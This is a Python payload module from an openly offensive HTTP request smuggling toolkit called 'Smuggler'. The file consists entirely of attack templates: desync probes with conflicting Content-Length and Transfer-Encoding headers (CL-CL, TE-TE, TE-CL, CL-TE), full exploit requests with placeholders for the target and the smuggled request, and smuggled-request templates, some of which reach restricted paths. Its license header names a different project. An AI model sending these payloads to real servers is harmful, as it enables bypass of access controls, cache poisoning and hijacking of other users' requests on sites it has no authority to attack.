#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
payloads={
    'CL-CL-0#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nContent-Length: 5\n\n12345Q',
    'CL-CL-1#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nContent-Length: 7\n\n0\n\nQ',
    'TE-TE-0#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\n\n3\nabc\nQ',
    'TE-TE-1#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\n\n0\n\nX',
    'TE-CL-0#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\n\n3\nabc\nQ',
    'TE-CL-1#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\n\nX\n\n0\n\nX',
    'CL-TE-0#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\n\n3\nabc\nQ',
    'CL-TE-1#User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\n\n0\n\nX'
	 }
exploits={
    'CL-CL-0#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nContent-Length: 5\n\n12345$SMUGGLED',
    'CL-CL-1#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nContent-Length: 7\n\n0\n\n$SMUGGLED',
    'TE-TE-0#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\n\n3\nabc\n$SMUGGLED',
    'TE-TE-1#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\n\n0\n\n$SMUGGLED',
    'TE-CL-0#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\n\n3\nabc\n$SMUGGLED',
    'TE-CL-1#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\n\nX\n\n0\n\n$SMUGGLED',
    'CL-TE-0#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\n\n3\nabc\n$SMUGGLED',
    'CL-TE-1#$method $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en-CA;q=0.7;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\Cache-Control: max-age=0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\n\n0\n\n$SMUGGLED'
     }
methods={
    '0#G',
    '1#$method $path HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\n\n$parameter=1234$method $path HTTP/1.1\r\nHost: $target',
    '2#$method $restricted HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\n\nX: X$method $path HTTP/1.1\r\nHost: $target',
    '3#$method $path HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\n\np=$files'
     }
